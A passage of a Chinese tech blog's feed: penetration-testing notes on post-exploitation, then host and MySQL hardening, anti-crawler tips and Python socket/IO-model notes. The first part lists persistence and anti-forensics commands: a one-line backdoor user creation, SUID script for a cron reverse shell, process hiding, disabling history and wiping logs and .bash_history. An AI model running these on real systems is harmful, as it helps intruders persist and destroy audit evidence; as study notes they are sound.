1401021042.30 webshell.php</code></li></ul></li><li>隐藏权限<blockquote><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的</p></blockquote></li><li>隐藏历史操作命令<ul><li>临时禁用历史功能：<code>[space]set +o history</code></li><li>备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</li></ul></li><li>进程隐藏<ul><li><code>https://github.com/gianlucaborello/libprocesshider</code><blockquote><p>top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序</p></blockquote></li><li>unhide：查看隐藏进程</li></ul></li></ul><p>后门</p><ul><li>一句话添加用户和密码<ul><li>useradd -p `openssl passwd -1 -salt &#39;salt&#39; 123456` guest<ul><li>-1(数字)：基于MD5的算法代号</li></ul></li></ul></li><li>ssh公私钥免密登录</li><li>crontab反弹shell<ul><li>创建shell脚本，例如在/etc/evil.sh<ul><li><code>chmod +sx /etc/evil.sh</code></li><li>s符号代表设置权限suid和sgid，使用权限组合u+s设定文件的用户的ID位，g+s设置组用户ID位</li></ul></li></ul></li></ul><p>ps:</p><blockquote><p>文件中除了普通的读、写、执行权限外，还有一些特殊的权限，我们可以使用 chmod和chown命令来设置。 他们分别是SUID, SGID, Stricky Bit, ACL’s, SUDO and SELinux 等，管理员可以使用这些命令管理文件/文件</p><p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix中，<strong>当一个程序运行的时候， 程序将从登录用户处继承权限</strong>。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件。简而言之用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。 </p></blockquote><p>meterpreter shell</p><ul><li>通过meterpreter shell获取持久性shell的方法有两种：<ul><li>Persistence模块</li><li>Metsvc 模块</li></ul></li></ul><h3 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">web日志，如apache的access.log,error.log。直接将日志清除过于明显,一般使用sed进行定向清除</span><br><span class="line"></span><br><span class="line">e.g. sed -i -e ‘/192.169.1.1/d’</span><br><span class="line"></span><br><span class="line"><span class="built_in">history</span>命令的清除，也是对~/.bash_history进行定向清除</span><br><span class="line"></span><br><span class="line">wtmp日志的清除，/var/<span class="built_in">log</span>/wtmp</span><br><span class="line"></span><br><span class="line">登录日志清除 /var/<span class="built_in">log</span>/secure</span><br><span class="line"></span><br><span class="line"><span class="built_in">history</span> -c  //清空历史执行命令</span><br><span class="line"><span class="built_in">echo</span> &gt; ./.bash_history //或清空用户目录下的这个文件即可</span><br></pre></td></tr></table></figure><h2 id="主机加固"><a href="#主机加固" class="headerlink" title="主机加固"></a>主机加固</h2><p>业务安全</p><blockquote><p>某个平台上的业务是指该平台用户在使用过程中涉及到的一系列流程，而业务安全就是保证这些流程按照预定的规则运行</p></blockquote><h3 id="反爬虫"><a href="#反爬虫" class="headerlink" title="反爬虫"></a>反爬虫</h3><ul><li>Headers的User-Agent<ul><li>有些爬虫的UA是特殊的，与正常浏览器的不一样，可通过识别特征UA，直接封掉爬虫请求</li></ul></li><li>设置IP访问频率，如果超过一定频率，弹出验证码<ul><li>如果输入正确的验证码，则放行，如果没有输入，则拉入禁止一段时间</li></ul></li><li>通过并发识别爬虫<ul><li>统计并发最高的IP，加入黑名单（或者直接封掉爬虫IP所在C段）</li></ul></li><li>蜜罐资源<ul><li>，适当在页面添加一些正常浏览器浏览访问不到的资源，一旦有ip访问，过滤下头部是不是搜素引擎的蜘蛛，不是就可以直接封了</li></ul></li></ul><h3 id="windows主机加固"><a href="#windows主机加固" class="headerlink" title="windows主机加固"></a>windows主机加固</h3><ul><li>本地用户和组<ul><li>禁用guest用户</li></ul></li><li>本地安全策略</li><li>事件查看器-&gt;windows日志<ul><li>设置日志大小</li></ul></li></ul><img src="/posts/cc1ceb62/2020-10-09-19-11-49.png" width height="200"><h3 id="Linux主机加固"><a href="#Linux主机加固" class="headerlink" title="Linux主机加固"></a>Linux主机加固</h3><ul><li>锁定系统中多余的自建帐号<ul><li><code>passwd -l &lt;user&gt;</code></li></ul></li><li>设置系统口令策略<ul><li>eg 设置口令过期时间</li><li><code>vim /etc/login.defs</code></li></ul></li><li>网络访问安全<ul><li>置访问控制策略限制能够使用ssh管理本机的IP地址</li><li><code>vim /etc/ssh/sshd_config</code></li></ul></li><li>日志<ul><li><code>Vi /etc/login.defs</code><ul><li><code>LASTLOG_ENAB   yes</code></li></ul></li><li>系统安全日志<ul><li><code>vim /etc/syslog.conf</code></li></ul></li></ul></li></ul><h3 id="mysql加固"><a href="#mysql加固" class="headerlink" title="mysql加固"></a>mysql加固</h3><ul><li>修改root用户口令，删除空口令<ul><li><code>mysqladmin password &lt;&gt;</code> </li></ul></li><li>禁止远程连接数据库<blockquote><p>在命令行netstat -ant下看到，默认的3306端口是打开的，此时打开了mysqld的网络监听，允许用户远程通过帐号密码连接数本地据库，默认情况是允许远程连接数据的。为了禁止该功能，启动skip-networking，不监听sql的任何TCP/IP的连接，切断远程访问的权利，保证安全性</p></blockquote><ul><li><code>vi /etc/my.cnf</code>将<code>#skip-networking</code>注释去掉</li></ul></li><li>用户目录权限限制<ul><li><code>Chown -R root /var/share/mysql</code><ul><li>递归处理，将指定目录下的所有文件及子目录一并处理</li><li><code>用户:组</code>：指定所有者和所属工作组。当省略“：组”，仅改变文件所有者</li></ul></li></ul></li><li>命令历史记录保护<blockquote><p>登陆数据库后的操作将记录在.<code>mysql_history</code>文件中，如果使用update表信息来修改数据库用户密码的话，也会被读取密码，因此需要删除这两个文件，同时在进行登陆或备份数据库等与密码相关操作时，应该使用-p参数加入提示输入密码后，隐式输入密码，建议将以上文件置空</p></blockquote><ul><li><code>ln -s /dev/null .mysql_history //将mysql记录文件置空</code></li></ul></li><li>禁止MySQL对本地文件存取<ul><li>关闭<code>load data local infile</code>权限<blockquote><p>黑客还能通过使用LOAD DATALOCAL INFILE装载“/etc/passwd”进一个数据库表，然后能用SELECT显示它，这个操作对服务器的安全来说，是致命的</p></blockquote></li><li>以在my.cnf中添加<code>local-infile=0</code></li></ul></li><li>使用chroot方式来控制MySQL的运行目录<ul><li>将其与主系统几乎完全隔离，也就是说，一旦遭到什么问题，也不会危及到正在运行的主系统<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[client]</span><br><span class="line">    socket &#x3D; &#x2F;chroot&#x2F;mysql&#x2F;tmp&#x2F;mysql.sock  </span><br></pre></td></tr></table></figure><blockquote><p>启动MySQL服务器时加上–chroot=path参数，让mysqld守护进程运行在chroot环境中。这样SQL语句LOAD DATA INFILE和Select … INTO OUTFILE就限定在chroot_path下读写文件了。</p><p>这里有一点要注意，MySQL启动后会建立一个mysql.sock文件，默认是在/tmp目录下。使用了chroot后，MySQL会在chroot_path/tmp去建立mysql.sock文件，如果没有chroot_path/tmp目录或启动MySQL的用户没有这个目录写权限就不能建立mysql.sock文件，MySQL会启动失败。</p><ul><li>比如我们加了<code>–chroot=/usr/local/mysql/</code>启动参数，那么最好建立一个启动MySQL的用户能写的/usr/local/mysql/tmp目录，当然我们也可以用<code>–socket=path</code>来指定mysql.sock文件的路径，但这个path一定要在chroot_path里面</li></ul></blockquote></li></ul></li></ul><h2 id="摘抄与参考"><a href="#摘抄与参考" class="headerlink" title="摘抄与参考"></a>摘抄与参考</h2><ul><li><a href="https://blog.csdn.net/wz_cow/article/details/82156011">Mysql安全加固_wz_cow的博客-CSDN博客</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 Exp，你在他家所做的就是不同的 Payload，就把窃听器当作 Shellcode 吧！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/&quot;&gt;渗透中 PoC、Exp、Payload 与 Shellcode 的区别&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;渗透测试框架&quot;&gt;&lt;a href=&quot;#渗透测试框架&quot; class=&quot;headerlink&quot; title=&quot;渗透测试框架&quot;&gt;&lt;/a&gt;渗透测试框架&lt;/h2&gt;&lt;h3 id=&quot;Metasploit&quot;&gt;&lt;a href=&quot;#Metasploit&quot; class=&quot;headerlink&quot; title=&quot;Metasploit&quot;&gt;&lt;/a&gt;Metasploit&lt;/h3&gt;&lt;h3 id=&quot;Empire&quot;&gt;&lt;a href=&quot;#Empire&quot; class=&quot;headerlink&quot; title=&quot;Empire&quot;&gt;&lt;/a&gt;Empire&lt;/h3&gt;&lt;h3 id=&quot;Cobalt-Strike&quot;&gt;&lt;a href=&quot;#Cobalt-Strike&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike&quot;&gt;&lt;/a&gt;Cobalt Strike&lt;/h3&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;渗透测试&quot;&gt;&lt;a href=&quot;#渗透测试&quot; class=&quot;headerlink&quot; title=&quot;渗透测试&quot;&gt;&lt;/a&gt;渗透测试&lt;/h2&gt;&lt;center&gt;&lt;img src=&quot;/posts/cc1ceb62/2.jpg&quot; height=&quot;350&quot;&gt;&lt;/center&gt;

&lt;h3 id=&quot;使用已知漏洞提权&quot;&gt;&lt;a href=&quot;#使用已知漏洞提权&quot; class=&quot;headerlink&quot; title=&quot;使用已知漏洞提权&quot;&gt;&lt;/a&gt;使用已知漏洞提权&lt;/h3&gt;</summary>
    
    
    
    <category term="Security" scheme="https://hejueyun.github.io/categories/Security/"/>
    
    <category term="Web Security" scheme="https://hejueyun.github.io/categories/Security/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>python socket编程笔记</title>
    <link href="https://hejueyun.github.io/posts/3cdb8d49/"/>
    <id>https://hejueyun.github.io/posts/3cdb8d49/</id>
    <published>2020-09-23T09:39:44.000Z</published>
    <updated>2021-04-25T07:09:09.226Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><h3 id="创建套接字"><a href="#创建套接字" class="headerlink" title="创建套接字"></a>创建套接字</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">udp_socket=socket.socket(AddressFamily,<span class="type">Type</span>)</span><br><span class="line"><span class="comment"># 1. 创建套接字 </span></span><br><span class="line"><span class="comment"># AddressFamily:AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6</span></span><br><span class="line"><span class="comment"># Type：套接字类型，可以是 SOCK_STREAM（流式套接字，主要用于 TCP 协议）或者 SOCK_DGRAM（数据报套接字，主要用于 UDP 协议） </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">udp_socket.sendto(<span class="string">&quot;我是发送的消息&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>),(<span class="string">&quot;10.200.202.119&quot;</span>,<span class="number">8888</span>))</span><br><span class="line"><span class="comment"># 2. 指定服务器ip和端口，并发送消息 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">receive_data, from_addr = udp_socket.recvfrom(buffersize) </span><br><span class="line"><span class="comment"># 3. 接受消息</span></span><br><span class="line"><span class="comment"># buffersize:指定一次接受的字节大小</span></span><br><span class="line"><span class="comment"># return:返回为一个元祖，第一个参数表示接受的数据，第二个参数表示消息来源地址</span></span><br><span class="line"></span><br><span class="line">udp_socket.close()</span><br><span class="line"><span class="comment"># 4. 关闭套接字 </span></span><br></pre></td></tr></table></figure><h3 id="UDP多线程聊天室"><a href="#UDP多线程聊天室" class="headerlink" title="UDP多线程聊天室"></a>UDP多线程聊天室</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">is_exit_send_msg = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">udp_socket, dest_addr</span>):</span></span><br><span class="line">    <span class="keyword">global</span> is_exit_send_msg</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send_data = <span class="built_in">input</span>(<span class="string">&quot;请输入要发送的内容：\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> send_data == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            is_exit_send_msg = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;退出发送消息&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        udp_socket.sendto(send_data.encode(<span class="string">&quot;GBK&quot;</span>), dest_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_msg</span>(<span class="params">udp_socket</span>):</span></span><br><span class="line">    <span class="keyword">global</span> is_exit_send_msg</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        receive_data, from_addr = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> receive_data.decode(<span class="string">&quot;GBK&quot;</span>) == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;退出接收消息&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(from_addr)+<span class="string">&quot; 发来消息：\n&quot;</span>+receive_data.decode(<span class="string">&quot;GBK&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_exit_send_msg:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入要发送的内容:&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 1.创建udp socket</span></span><br><span class="line">    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="comment"># 2.输入要连接的ip和端口</span></span><br><span class="line">    dest_ip = <span class="built_in">input</span>(<span class="string">&quot;输入要连接的ip:\n&quot;</span>)</span><br><span class="line">    dest_port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入端口号：\n&quot;</span>))</span><br><span class="line">    dest_addr = (dest_ip, dest_port)</span><br><span class="line">    <span class="comment"># 3.创建发送消息线程</span></span><br><span class="line">    thread_send = threading.Thread(target=send_msg, args=(udp_socket, dest_addr))</span><br><span class="line">    <span class="comment"># 4.创建接收消息线程</span></span><br><span class="line">    thread_receive = threading.Thread(target=receive_msg, args=(udp_socket,))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5.开启发送消息线程</span></span><br><span class="line">    thread_send.start()</span><br><span class="line">    <span class="comment"># 6.开启接收消息线程</span></span><br><span class="line">    thread_receive.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><h3 id="TCP客户端"><a href="#TCP客户端" class="headerlink" title="TCP客户端"></a>TCP客户端</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建套接字</span></span><br><span class="line">tcp_socket = socket.socket(AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#连接服务器，需指定服务器ip和端口</span></span><br><span class="line">tcp_socket.connet((ip,port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送数据/接受数据</span></span><br><span class="line">tcp_socket.send(<span class="string">&quot;我是发送的消息&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">receive_data = tcp_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭套接字</span></span><br><span class="line">tcp_socket.close() </span><br></pre></td></tr></table></figure><h3 id="TCP服务端"><a href="#TCP服务端" class="headerlink" title="TCP服务端"></a>TCP服务端</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建套接字</span></span><br><span class="line">tcp_server_socket = socket.socket(AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 绑定服务端ip和端口 </span></span><br><span class="line">tcp_server_socket.bind((ip,port)) </span><br><span class="line"><span class="comment"># 开启监听，监听客户端连接</span></span><br><span class="line">tcp_server_socket.listen(<span class="built_in">max</span>) </span><br><span class="line"><span class="comment"># max:表示同时客户端最大的连接数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># accept:接受一个客户端连接并返回一个处理这个连接的socket</span></span><br><span class="line">new_client_socket,client_addr = tcp_server_socket.accept() </span><br><span class="line"><span class="comment"># new_client_socket:处理这个连接的socket</span></span><br><span class="line"><span class="comment"># client_addr:连接客户端的地址（ip和端口号）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接受/发送消息</span></span><br><span class="line">receive_data=new_client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">new_client_socket.send(<span class="string">&quot;我是发送的消息&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)) </span><br></pre></td></tr></table></figure><h2 id="select-poll-epoll"><a href="#select-poll-epoll" class="headerlink" title="select poll epoll"></a>select poll epoll</h2><blockquote><p>network IO</p></blockquote><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>现在操作系统都是采用虚拟存储器，那么对32位操作系统而言，它的寻址空间（虚拟存储空间）为4G（2的32次方）。操作系统的核心是内核，独立于普通的应用程序，可以访问受保护的内存空间，也有访问底层硬件设备的所有权限。<strong>为了保证用户进程不能直接操作内核（kernel），保证内核的安全，操心系统将虚拟空间划分为两部分，一部分为内核空间，一部分为用户空间</strong>。</p><ul><li>针对linux操作系统而言，将最高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为<strong>内核空间</strong></li><li>而将较低的3G字节（从虚拟地址0x00000000到0xBFFFFFFF），供各个进程使用，称为<strong>用户空间</strong></li></ul></blockquote><h3 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h3><blockquote><p>正在执行的进程，由于期待的某些事件未发生，如<strong>请求系统资源失败、等待某种操作的完成、新数据尚未到达或无新工作做等</strong>，则由系统自动执行阻塞原语(Block)，使自己由运行状态变为阻塞状态。</p><p>可见，进程的阻塞是进程自身的一种主动行为，也因此只有处于运行态的进程（获得CPU），才可能将其转为阻塞状态。<strong>当进程进入阻塞状态，是不占用CPU资源的</strong></p></blockquote><p><em>原语大概就是原子语句吧</em></p><h3 id="IO模式"><a href="#IO模式" class="headerlink" title="IO模式"></a>IO模式</h3><ul><li>阻塞 I/O（blocking IO）<ul><li>准备数据阶段（数据被拷贝到操作系统内核的缓冲区中是需要一个过程的）</li><li>而在用户进程这边，整个进程会被阻塞（当然，是进程自己选择的阻塞）。当kernel一直等到数据准备好了，它就会将数据从kernel中拷贝到用户内存，然后kernel返回结果，用户进程才解除block的状态，重新运行起来</li></ul></li><li>非阻塞 I/O（nonblocking IO）<ul><li>轮询</li><li>当用户进程发出read操作时，如果kernel中的数据还没有准备好，那么它并不会block用户进程，而是立刻返回一个error。从用户进程角度讲 ，它发起一个read操作后，并不需要等待，而是马上就得到了一个结果</li><li>相比阻塞I/O少一次阻塞</li></ul></li><li>I/O 多路复用（ IO multiplexing）<ul><li>select，poll，epoll</li><li><strong>I/O多路复用就通过一种机制，可以监视多个描述符，一旦某个描述符就绪（一般是读就绪或者写就绪），能够通知程序进行相应的读写操作</strong></li><li>如果处理的连接数不是很高的话，使用select/epoll的web server不一定比使用multi-threading + blocking IO的web server性能更好，可能延迟还更大。<strong>select/epoll的优势并不是对于单个连接能处理得更快，而是在于能处理更多的连接</strong></li></ul></li></ul><img src="/posts/3cdb8d49/2020-09-29-13-48-56.png" width height="250"><ul><li>信号驱动 I/O（ signal driven IO）</li><li>异步 I/O（asynchronous IO）<ul><li>用户进程发起read操作之后，立刻就可以开始去做其它的事。而另一方面，从kernel的角度，当它受到一个asynchronous read之后，首先它会立刻返回，所以不会对用户进程产生任何block。<strong>然后，kernel会等待数据准备完成，然后将数据拷贝到用户内存，当这一切都完成之后，kernel会给用户进程发送一个signal，告诉它read操作完成了</strong></li></ul></li></ul><h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><blockquote><p>文件描述符是Unix系统标识文件的int，Unix的哲学一切皆文件，<strong>所以各自资源</strong>（包括常规意义的文件、目录、管道、POSIX IPC、socket）<strong>都可以看成文件</strong>。文件描述符是内核提供给用户来安全地操作文件的标识，不像指针，拥有了指针后你能瞎JB改。<strong>拥有了描述符后，你只能传入描述符给特定的接口，实际操作由内核读取用户输入的参数后来安全地执行</strong></p></blockquote><ul><li>select<ul><li>查询 fd_set 中，是否有就绪的 fd，可以设定一个超时时间，当有 fd (File descripter) 就绪或超时返回</li></ul></li><li>poll<ul><li>poll 中将 select 中的 fd_set 替换成了一个 pollfd 数组</li><li>解决 fd 数量过小的问题</li></ul></li><li>epoll<ul><li>事件（event）驱动</li><li>为每个 fd，注册一个监听事件</li><li>fd 变更为就绪时，将 fd 添加到就绪链表</li></ul></li></ul><h4 id="内核缓冲与用户缓冲"><a href="#内核缓冲与用户缓冲" class="headerlink" title="内核缓冲与用户缓冲"></a>内核缓冲与用户缓冲</h4><blockquote><p>内核态可以访问系统资源</p><ul><li>处理器cpu</li><li>输入输出IO</li><li>…<br>而上面所说的这些系统资源，在用户进程中是无法被直接访问的，只能通过操作系统来访问，所以也把操作系统提供的这些功能成为:“系统调用”</li></ul></blockquote><p>用户缓冲</p><blockquote><p>一些程序在读取文件时，会先申请一块内存数组，称为buffer，然后每次调用read，读取设定字节长度的数据，写入buffer。（用较小的次数填满buffer）。之后的程序都是从buffer中获取数据，当buffer使用完后，在进行下一次调用，填充buffer。</p><p>所以说：<strong>用户缓冲区的目的是为了减少系统调用次数，从而降低操作系统在用户态与核心态切换所耗费的时间</strong></p></blockquote><p>内核缓冲</p><blockquote><p><strong>内核缓冲区，是为了在OS级别，提高磁盘IO效率，优化磁盘写操作</strong></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://qingshanliao.gitbook.io/gitbook-python/python-jin-jie/01-wang-luo-bian-cheng/01-wang-luo-bian-cheng">01-网络编程 - python手册</a></li><li><a href="https://segmentfault.com/a/1190000003063859">Linux IO模式及 select、poll、epoll详解_人云思云 - SegmentFault 思否</a></li><li><a href="http://www.pulpcode.cn/2017/02/01/user-buffer-and-kernel-buffer/">用户进程缓冲区和内核缓冲区</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;UDP&quot;&gt;&lt;a href=&quot;#UDP&quot; class=&quot;headerlink&quot; title=&quot;UDP&quot;&gt;&lt;/a&gt;UDP&lt;/h2&gt;&lt;h3 id=&quot;创建套接字&quot;&gt;&lt;a href=&quot;#创建套接字&quot; class=&quot;headerlink&quot; title=&quot;创建套接字&quot;&gt;&lt;/a&gt;创建套接字&lt;/h3&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;udp_socket=socket.socket(AddressFamily,&lt;span class=&quot;type&quot;&gt;Type&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 1. 创建套接字 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# AddressFamily:AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Type：套接字类型，可以是 SOCK_STREAM（流式套接字，主要用于 TCP 协议）或者 SOCK_DGRAM（数据报套接字，主要用于 UDP 协议） &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;udp_socket.sendto(&lt;span class=&quot;string&quot;&gt;&amp;quot;我是发送的消息&amp;quot;&lt;/span&gt;.encode(&lt;span class=&quot;string&quot;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;),(&lt;span class=&quot;string&quot;&gt;&amp;quot;10.200.202.119&amp;quot;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;8888&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 2. 指定服务器ip和端口，并发送消息 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 